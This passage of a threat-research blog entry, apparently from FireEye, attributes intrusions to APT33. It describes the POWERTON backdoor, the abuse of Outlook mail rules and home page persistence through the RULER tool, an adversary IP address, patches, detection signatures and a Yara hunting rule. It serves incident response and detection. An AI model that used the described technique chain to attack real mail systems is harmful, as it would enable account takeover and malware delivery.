valign=\u0022top\u0022\u003E\u003Cp\u003E8be06571e915ae3f76901d52068e3498\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-12-13 11:00:00\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EGroupB \u2013 POWERTON (Identified)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E99649d58c0d502b2dfada02124b1504c\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 1: Operational Timeline\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EOutlook and Implications\u003C\/h4\u003E\n\u003Cp\u003EIf the activities observed during these intrusions are linked to APT33, it would suggest that APT33 has likely maintained proprietary capabilities we had not previously observed until sustained pressure from Managed Defense forced their use. FireEye Intelligence has previously reported that APT33 has ties to destructive malware, and they pose a heightened risk to critical infrastructure. This risk is pronounced in the energy sector, which we consistently observe them target. That targeting aligns with Iranian national priorities for economic growth and competitive advantage, especially relating to petrochemical production.\u003C\/p\u003E\n\u003Cp\u003EWe will continue to track these clusters independently until we achieve high confidence that they are the same. The operators behind each of the described intrusions are using publicly available but not widely understood tools and techniques in addition to proprietary implants as needed. Managed Defense has the privilege of being exposed to intrusion activity every day across a wide spectrum of industries and adversaries. This daily front line experience is backed by Advanced Practices, FireEye Labs Advanced Reverse Engineering (FLARE), and FireEye Intelligence to give our clients every advantage they can have against sophisticated adversaries. We welcome additional original source information we can evaluate to confirm or refute our analytical judgements on attribution.\u003C\/p\u003E\n\u003Ch4\u003ECustom Backdoor: POWERTON\u003C\/h4\u003E\n\u003Cp\u003EPOWERTON is a backdoor written in PowerShell; FireEye has not yet identified any publicly available toolset with a similar code base, indicating that it is likely custom-built. POWERTON is designed to support multiple persistence mechanisms, including \u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2016\/08\/wmi_vs_wmi_monitor.html\u0022\u003EWMI\u003C\/a\u003E\u0026nbsp;and auto-run registry key. Communications with the C2 are over TCP\/HTTP(S) and leverage AES encryption for communication traffic to and from the C2. POWERTON typically gets deployed as a later stage backdoor and is obfuscated several layers.\u003C\/p\u003E\n\u003Cp\u003EFireEye has witnessed at least two separate versions of POWERTON, tracked separately as POWERTON.v1 and POWERTON.v2, wherein the latter has improved its command and control functionality, and integrated the ability to dump password hashes.\u003C\/p\u003E\n\u003Cp\u003ETable 2 contains samples of POWERTON.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022672\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022282\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EHash of Obfuscated File (MD5)\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022294\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EHash of Deobfuscated File (MD5)\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002296\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EVersion\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022282\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003E974b999186ff434bee3ab6d61411731f\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022294\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E3871aac486ba79215f2155f32d581dc2\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002296\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EV1\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022282\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003Ee2d60bb6e3e67591e13b6a8178d89736\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022294\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2cd286711151efb61a15e2e11736d7d2\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002296\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EV1\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022282\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003Ebd80fcf5e70a0677ba94b3f7c011440e\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022294\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E5a66480e100d4f14e12fceb60e91371d\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002296\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EV1\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022282\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003E4047e238bbcec147f8b97d849ef40ce5\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022294\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ef5ac89d406e698e169ba34fea59a780e\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002296\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EV2\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022282\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003Ec38069d0bc79acdc28af3820c1123e53\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022294\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E4aca006b9afe85b1f11314b39ee270f7\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002296\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EV2\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022282\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EN\/A\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022294\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E7f4f7e307a11f121d8659ca98bc8ba56\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002296\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EV2\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022282\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003E53ae59ed03fa5df3bf738bc0775a91d9\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022294\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E99649d58c0d502b2dfada02124b1504c\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002296\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EV2\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 2: POWERTON malware samples\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EAdversary Methods: Email Exploitation on the Rise\u003C\/h4\u003E\n\u003Cp\u003EOutlook and Exchange are ubiquitous with the concept of email access. User convenience is a primary driver behind technological advancements, but convenient access for users often reveals additional attack surface for adversaries. As organizations expose any email server access to the public internet for its users, those systems become intrusion vectors. FireEye has observed an increase in \u003Ca href=\u0022https:\/\/summit.fireeye.com\/content\/fireeye-summit\/en_US\/learn\/tracks.html#technical-3\u0022\u003Etargeted adversaries challenging and subverting security controls on Exchange and Office365.\u003C\/a\u003E Our Mandiant consultants also presented \u003Ca href=\u0022https:\/\/summit.fireeye.com\/learn\/tracks.html#technical-8\u0022\u003Eseveral new methods used by adversaries to subvert multifactor authentication\u003C\/a\u003E at FireEye Cyber Defense Summit 2018.\u003C\/p\u003E\n\u003Cp\u003EAt FireEye, our decisions are data driven, but data provided to us is often incomplete and missing pieces must be inferred based on our expertise in order for us to respond to intrusions effectively. A plausible scenario for exploitation of this vector is as follows.\u003C\/p\u003E\n\u003Cp\u003EAn adversary has a single pair of valid credentials for a user within your organization obtained through any means, to include the following non-exhaustive examples:\u003C\/p\u003E\n\u003Cul style=\u0022list-style-position: inside;\u0022\u003E\n\u003Cli\u003EThird party breaches where your users have re-used credentials; does your enterprise leverage a naming standard for email addresses such as first.last@yourorganization.tld? It is possible that a user within your organization has a personal email address with a first and last name--and an affiliated password--compromised in a third-party breach somewhere. Did they re-use that password?\u003C\/li\u003E\n\u003Cli\u003EPrevious compromise within your organization where credentials were compromised but not identified or reset.\u003C\/li\u003E\n\u003Cli\u003EPoor password choice or password security policies resulting in brute-forced credentials.\u003C\/li\u003E\n\u003Cli\u003EGathering of crackable password hashes from various other sources, such as NTLM hashes gathered via \u003Ca href=\u0022https:\/\/bohops.com\/2018\/08\/04\/capturing-netntlm-hashes-with-office-dot-xml-documents\/\u0022\u003Edocuments\u003C\/a\u003E intended to phish them from users.\u003C\/li\u003E\n\u003Cli\u003ECredential harvesting phishing scams, where harvested credentials may be sold, re-used, or documented permanently elsewhere on the internet.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EOnce the adversary has legitimate credentials, they identify publicly accessible Outlook Web Access (OWA) or Office 365 that is not protected with multi-factor authentication. The adversary leverages the stolen credentials and a tool like RULER to deliver exploits through Exchange\u2019s legitimate features.\u003C\/p\u003E\n\u003Ch4\u003ERULER In-The-Wild: Here, There, and Everywhere\u003C\/h4\u003E\n\u003Cp\u003ESensePost\u2019s RULER is a tool designed to interact with Exchange servers via a messaging application programming interface (MAPI), or via remote procedure calls (RPC), both over HTTP protocol. As detailed in the \u0026quot;Managed Defense Rapid Responses\u0026quot; section, in mid-November 2017, FireEye witnessed network activity generated by an existing Outlook email client process on a single host, indicating connection via Web Distributed Authoring and Versioning (WebDAV) to an adversary-controlled IP address \u003Cspan class=\u0022code\u0022\u003E85.206.161[.]214.\u003C\/span\u003E This communication retrieved an executable created with \u003Cu\u003EAut2Exe\u003C\/u\u003E (MD5: \u003Ci\u003E95f3bea43338addc1ad951cd2d42eb6f)\u003C\/i\u003E, and executed a PowerShell one-liner to retrieve further malicious content.\u003C\/p\u003E\n\u003Cp\u003EWithout the requisite logging from the impacted mailbox, we can still assess that this activity was the result of a malicious mail rule created using the aforementioned tooling for the following reasons:\u003C\/p\u003E\n\u003Cul style=\u0022list-style-position: inside;\u0022\u003E\n\u003Cli\u003EOutlook.exe directly requested the malicious executable hosted at the adversary IP address over WebDAV. This is unexpected unless some feature of Outlook directly was exploited; traditional vectors like phishing would show a process ancestry where Outlook spawned a child process of an Office product, Acrobat, or something similar. Process injection would imply prior malicious code execution on the host, which evidence did not support.\u003C\/li\u003E\n\u003Cli\u003EThe transfer of \u003Ci\u003E95f3bea43338addc1ad951cd2d42eb6f\u003C\/i\u003E was over WebDAV. RULER facilitates this by exposing a simple WebDAV server, and a command line module for creating a client-side mail rule to point at that \u003Ca href=\u0022https:\/\/github.com\/sensepost\/ruler\/wiki\/Rules#webdav\u0022\u003EWebDAV hosted payload\u003C\/a\u003E.\u003C\/li\u003E\n\u003Cli\u003EThe choice of WebDAV for this initial transfer of stager is the result of restrictions in mail rule creation; the payload must be \u0026quot;locally\u0026quot; accessible before the rule can be saved, meaning protocol handlers for something like HTTP or FTP are not permitted. This is thoroughly detailed in Silent Break Security\u0027s \u003Ca href=\u0022https:\/\/silentbreaksecurity.com\/malicious-outlook-rules\/\u0022\u003Einitial write-up\u003C\/a\u003E prior to RULER\u2019s creation. This leaves SMB and WebDAV via UNC file pathing as the available options for transferring your malicious payload via an Outlook Rule. WebDAV is likely the less alerting option from a networking perspective, as one is more likely to find WebDAV transactions occurring over ports 80 and 443 to the internet than they are to find a domain joined host communicating via SMB to a non-domain joined host at an arbitrary IP address.\u003C\/li\u003E\n\u003Cli\u003EThe payload to be executed via Outlook client-side mail rule must contain no arguments, which is likely why a compiled Aut2exe executable was chosen. \u003Ci\u003E95f3bea43338addc1ad951cd2d42eb6f\u003C\/i\u003E does nothing but execute a PowerShell one-liner to retrieve additional malicious content for execution. However, execution of this command natively using an Outlook rule was not possible due to this limitation.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EWith that in mind, the initial infection vector is illustrated in Figure 4.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/OVERRULED\/Picture4.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: Initial infection vector\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EAs both attackers and defenders continue to explore email security, publicly-released techniques and exploits are quickly adopted. SensePost\u0027s identification and responsible \u003Ca href=\u0022https:\/\/portal.msrc.microsoft.com\/en-us\/security-guidance\/advisory\/CVE-2017-11774\u0022\u003Edisclosure of CVE-2017-11774\u003C\/a\u003E was no different. For an excellent description of abusing Outlook\u0027s home page for shell and persistence from an attacker\u2019s perspective, \u003Ca href=\u0022https:\/\/sensepost.com\/blog\/2017\/outlook-home-page-another-ruler-vector\/\u0022\u003Erefer to SensePost\u0027s blog\u003C\/a\u003E.\u003C\/p\u003E\n\u003Cp\u003EFireEye\u0026nbsp;\u003Ca href=\u0022https:\/\/summit.fireeye.com\/content\/dam\/fireeye-www\/summit\/cds-2018\/presentations\/cds18-technical-s03-youve-got-mail.pdf\u0022\u003Ehas observed\u003C\/a\u003E and \u003Ca href=\u0022https:\/\/twitter.com\/ItsReallyNick\/status\/1014522001900306433\u0022\u003Edocumented\u003C\/a\u003E an uptick\u0026nbsp;in\u0026nbsp;several malicious attackers\u0027 usage of this specific home page exploitation technique. Based on our experience, this particular method may be more successful due to defenders misinterpreting artifacts and focusing on incorrect mitigations. This is understandable, as some defenders may first learn of successful CVE-2017-11774 exploitation when observing Outlook spawning processes resulting in malicious code execution. When this observation is combined with standalone forensic artifacts that may look similar to malicious HTML Application (.hta) attachments, the evidence may be misinterpreted as initial infection via a phishing email. This incorrect assumption overlooks the fact that attackers require valid credentials to deploy CVE-2017-11774, and thus the scope of the compromise may be greater than individual users\u0027 Outlook clients where home page persistence is discovered. To assist defenders, we\u0027re including a Yara rule to differentiate these Outlook home page payloads at the end of this post.\u003C\/p\u003E\n\u003Cp\u003EUnderstanding this nuance further highlights the exposure to this technique when combined with password spraying as documented with this attacker, and underscores the importance of layered email security defenses, including multi-factor authentication\u0026nbsp;and patch management. We recommend the organizations reduce their email attack surface as much as possible. Of note, organizations that choose to host their email with a cloud service provider must still ensure the software clients used to access that server are patched. Beyond implementing multi-factor authentication for Outlook 365\/Exchange access, the Microsoft security updates in Table 3 will assist in mitigating known and documented attack vectors that are exposed for exploitation by toolkits such as SensePost\u2019s RULER.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EMicrosoft Outlook Security Update\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ERULER Module Addressed\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Ca href=\u0022https:\/\/support.microsoft.com\/en-us\/help\/3191938\/descriptionofthesecurityupdateforoutlook2013june13-2017\u0022\u003EJune 13, 2017 Security Update\u003C\/a\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Ca href=\u0022https:\/\/sensepost.com\/blog\/2016\/mapi-over-http-and-mailrule-pwnage\/\u0022\u003ERULER.RULES\u003C\/a\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Ca href=\u0022https:\/\/support.microsoft.com\/en-us\/help\/4011091\/descriptionofthesecurityupdateforoutlook2016september12-2017\u0022\u003ESeptember 12, 2017 Security Update\u003C\/a\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Ca href=\u0022https:\/\/sensepost.com\/blog\/2017\/outlook-forms-and-shells\/\u0022\u003ERULER.FORMS\u003C\/a\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Ca href=\u0022https:\/\/support.microsoft.com\/en-us\/help\/4011162\/description-of-the-security-update-for-outlook-2016-october-10-2017\u0022\u003EOctober 10, 2017 Security Update\u003C\/a\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Ca href=\u0022https:\/\/sensepost.com\/blog\/2017\/outlook-home-page-another-ruler-vector\/\u0022\u003ERULER.HOMEPAGE\u003C\/a\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 3: Outlook attack surface mitigations\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EDetecting the Techniques\u003C\/h4\u003E\n\u003Cp\u003EFireEye detected this activity across our platform, including named detection for POSHC2, PUPYRAT, and POWERTON. Table 4 contains several specific detection names that applied to the email exploitation and initial infection activity.\u003Cb\u003E\u003C\/b\u003E\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022702\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EPLATFORM\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022558\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ESIGNATURE NAME\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EEndpoint Security\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022558\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPOWERSHELL ENCODED REMOTE DOWNLOAD (METHODOLOGY)\u003Cbr\u003E\nSUSPICIOUS POWERSHELL USAGE (METHODOLOGY)\u003Cbr\u003E\nMIMIKATZ (CREDENTIAL STEALER)\u003Cbr\u003E\nRULER OUTLOOK PERSISTENCE (UTILITY)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ENetwork and Email Security\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022558\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFE_Exploit_HTML_CVE201711774\u003Cbr\u003E\nFE_HackTool_Win_RULER\u003Cbr\u003E\nFE_HackTool_Linux_RULER\u003Cbr\u003E\nFE_HackTool_OSX_RULER\u003Cbr\u003E\nFE_Trojan_OLE_RULER\u003Cbr\u003E\nHackTool.RULER (Network Traffic)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 4: FireEye product detections\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EFor organizations interested in hunting for Outlook home page shell and persistence, we\u2019ve included a Yara rule that can also be used for context to differentiate these payloads from other scripts:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Erule Hunting_Outlook_Homepage_Shell_and_Persistence\u003Cbr\u003E\n {\u003Cbr\u003E\n meta:\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; author = \u0026quot;Nick Carr (@itsreallynick)\u0026quot;\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; reference_hash = \u0026quot;506fe019d48ff23fac8ae3b6dd754f6e\u0026quot;\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp; strings:\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $script_1 = \u0026quot;\u0026lt;htm\u0026quot; ascii nocase wide\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $script_2 = \u0026quot;\u0026lt;script\u0026quot; ascii nocase wide\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $viewctl1_a = \u0026quot;ViewCtl1\u0026quot; ascii nocase wide\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $viewctl1_b = \u0026quot;0006F063-0000-0000-C000-000000000046\u0026quot; ascii wide\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $viewctl1_c = \u0026quot;.OutlookApplication\u0026quot; ascii nocase wide\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp; condition:\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; uint16(0) != 0x5A4D and all of ($script*) and any of ($viewctl1*)\u003Cbr\u003E\n }\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EAcknowledgements\u003C\/h4\u003E\n\u003Cp\u003EThe authors would like to thank Matt Berninger for providing data science support for attribution augmentation projects, Omar Sardar (FLARE) for reverse engineering POWERTON, and Joseph Reyes (FireEye Labs) for continued comprehensive Outlook client exploitation product coverage.\u003C\/p\u003E\n",
        "jcr:lastModified": "Fri Dec 21 2018 14:01:38 GMT-0500",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Fri Dec 21 2018 13:29:27 GMT-0500",
      "imageRotate": "0"
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EFireEye assesses APT33 may be behind a series of intrusions and attempted intrusions within the engineering industry.\u003C\/p\u003E\n",
      "jcr:lastModified": "Fri Dec 21 2018 13:28:09 GMT-0500",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    }
  }
}
